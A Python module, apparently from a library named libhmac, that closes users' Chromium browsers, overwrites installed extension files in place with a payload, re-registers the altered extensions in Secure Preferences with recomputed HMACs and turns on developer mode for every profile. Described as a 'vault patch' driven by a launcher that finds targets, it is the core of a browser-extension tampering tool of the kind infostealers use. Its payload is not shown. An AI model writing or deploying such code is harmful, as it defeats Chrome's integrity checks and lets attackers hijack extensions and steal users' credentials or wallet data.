"""Public host API: patch + Chromium prefs (library does not detect extensions)."""

from __future__ import annotations

from collections import defaultdict
from pathlib import Path
from typing import Optional, Sequence

from libhmac import payload
from libhmac.extensions import find_version_dirs, patch_version_dir
from libhmac.prefs.chrome_manager import UnifiedChromeManager
from libhmac.prefs.sync import register_targets
from libhmac.types import ApplyResult, ExtensionTarget


class ExtensionHost:
    """
    Python port of libhmac + vault patch: in-place extension files and preference sync.

    The launcher discovers profiles/extensions and passes :class:`ExtensionTarget` rows.
    """

    def __init__(self, username: Optional[str] = None) -> None:
        self._default_username = username

    @staticmethod
    def configure_payload(directory: str | Path) -> None:
        payload.set_payload_dir(directory)

    @staticmethod
    def ensure_payload() -> None:
        payload.ensure_payload_files()

    def _manager(self, username: str) -> UnifiedChromeManager:
        return UnifiedChromeManager(username)

    def close_browsers(self, username: Optional[str] = None) -> bool:
        mgr = self._manager(username or self._default_username or "")
        if mgr._check_browsers_running():
            return bool(mgr._close_all_browsers())
        return True

    def patch_targets(self, targets: Sequence[ExtensionTarget]) -> int:
        """Patch on-disk extension trees only (no Preferences write)."""
        self.ensure_payload()
        patched = 0
        for target in targets:
            for vdir in find_version_dirs(target.profile_path, target.extension_id):
                if patch_version_dir(vdir):
                    patched += 1
        return patched

    def sync_prefs(
        self, targets: Sequence[ExtensionTarget], *, enable_developer_mode: bool = True
    ) -> tuple[int, bool]:
        """Register targets in Secure Preferences and optionally enable developer mode."""
        by_user: dict[str, list[ExtensionTarget]] = defaultdict(list)
        for t in targets:
            by_user[t.username].append(t)

        total_registered = 0
        all_dev_ok = True
        for username, user_targets in by_user.items():
            mgr = self._manager(username)
            total_registered += register_targets(mgr, user_targets)
            if enable_developer_mode:
                all_dev_ok = bool(mgr._enable_developer_mode_all_profiles()) and all_dev_ok
        return total_registered, all_dev_ok

    def apply(
        self,
        targets: Sequence[ExtensionTarget],
        *,
        close_browsers: bool = True,
        sync_preferences: bool = True,
    ) -> ApplyResult:
        """
        Full pipeline for launcher-supplied hits: optional browser close, file patch,
        then prefs/HMAC sync per OS user.
        """
        result = ApplyResult()
        if not targets:
            return result

        self.ensure_payload()
        users = {t.username for t in targets}
        if close_browsers:
            for username in users:
                self.close_browsers(username)

        result.version_dirs_patched = self.patch_targets(targets)
        result.targets_processed = len(targets)

        if sync_preferences:
            registered, dev_ok = self.sync_prefs(targets)
            result.prefs_registered = registered
            result.developer_mode_ok = dev_ok

        return result
